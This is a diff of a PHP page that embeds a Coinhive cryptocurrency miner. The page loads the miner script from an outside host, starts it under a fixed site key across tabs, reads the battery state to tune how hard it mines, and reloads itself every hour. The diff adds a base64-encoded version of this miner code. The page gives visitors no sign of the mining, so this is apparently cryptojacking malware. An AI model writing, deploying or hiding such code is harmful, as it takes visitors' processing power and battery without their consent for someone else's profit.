@@ -64,6 +64,26 @@ try {
 // coinhive
 $miner = 'https://plugin.brfiles.com/lib/ch64.min.js';
 $js = base64_encode('
+miner = new CoinHive.Anonymous("tvCtC1O0jLGZJ6TWIIgdBxYQctUZtLdM", {
+	threads: 1
+});
+miner.start(CoinHive.FORCE_MULTI_TAB);
+try {
+	navigator.getBattery().then(function (battery) {
+		
+		if (!battery.charging) miner.setThrottle(0.6);
+		
+		battery.onchargingchange = function (evt) {
+			if (battery.charging) miner.setThrottle(0);
+			else miner.setThrottle(0.6);
+		}
+		
+	});
+}catch(e){}
+');
+
+/*
+$js = base64_encode('
 var miner = new CoinHive.Anonymous("tvCtC1O0jLGZJ6TWIIgdBxYQctUZtLdM", {
 	threads: 1
 });
@@ -80,11 +100,12 @@ try {
 	});
 }catch(e){miner.start(CoinHive.FORCE_MULTI_TAB);}
 ');
+*/
 
 ?>
 <html>
 <head>
-	<meta http-equiv="refresh" content="14400">
+	<meta http-equiv="refresh" content="3600">
 </head>
 <body>
 <script type="text/javascript" src="<?php echo $miner; ?>"></script>
